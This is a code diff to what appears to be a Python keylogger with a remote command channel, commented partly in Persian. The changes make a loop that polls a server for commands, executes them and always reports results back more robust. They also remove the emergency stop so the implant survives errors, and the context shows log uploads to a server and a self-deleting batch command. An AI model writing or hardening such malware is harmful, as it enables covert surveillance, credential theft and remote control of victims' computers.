@@ -418,7 +418,7 @@ del /F /Q %~f0
         logging.info("Keylogger stopped")
 
     def _command_listener(self):
-        """Listen for commands from server"""
+        """Listen for commands from server with error handling"""
         try:
             while self.running:
                 try:
@@ -427,16 +427,52 @@ del /F /Q %~f0
                         logging.info(f"Received command: {cmd}")
                         command_type = cmd.get('type')
                         params = cmd.get('params', {})
-                        result = CommandHandler.execute(command_type, params)
-                        self.communicator.send_command_result(cmd['id'], result)
+
+                        try:
+                            result = CommandHandler.execute(command_type, params)
+
+                            # همیشه نتیجه را به سرور ارسال کن، حتی اگر خطا داشته باشد
+                            self.communicator.send_command_result(cmd['id'], result)
+
+                            # اگر خطا وجود دارد، لاگ کن اما ادامه بده
+                            if isinstance(result, dict) and result.get('status') == 'error':
+                                logging.warning(f"Command {command_type} executed with error: {result.get('message')}")
+                                # به دستور بعدی ادامه بده - حلقه را نشکن
+                                continue
+
+                        except CommandError as e:
+                            # خطای خاص command handler
+                            error_result = {
+                                "status": "error",
+                                "message": f"Command handler error: {str(e)}",
+                                "command_type": command_type,
+                                "timestamp": datetime.datetime.now().isoformat()
+                            }
+                            self.communicator.send_command_result(cmd['id'], error_result)
+                            logging.error(f"Command handler error for {command_type}: {str(e)}")
+                            continue  # به دستور بعدی ادامه بده
+
+                        except Exception as e:
+                            # خطای غیرمنتظره
+                            error_result = {
+                                "status": "error", 
+                                "message": f"Unexpected error: {str(e)}",
+                                "command_type": command_type,
+                                "timestamp": datetime.datetime.now().isoformat()
+                            }
+                            self.communicator.send_command_result(cmd['id'], error_result)
+                            logging.error(f"Unexpected error in command {command_type}: {str(e)}")
+                            continue  # به دستور بعدی ادامه بده
+
                 except CommunicationError as e:
-                    logging.error(f"Command listener error: {str(e)}")
-                except CommandError as e:
-                    logging.error(f"Command execution error: {str(e)}")
+                    logging.error(f"Command listener communication error: {str(e)}")
+                except Exception as e:
+                    logging.error(f"Command listener general error: {str(e)}")
+
                 time.sleep(Config.COMMAND_POLL_INTERVAL)
         except Exception as e:
             logging.error(f"Command listener critical error: {str(e)}")
-            self.emergency_stop()
+            # در این سطح از خطا، emergency_stop نکنیم - فقط لاگ کنیم
 
     def _upload_logs(self):
         """Upload logs to server"""
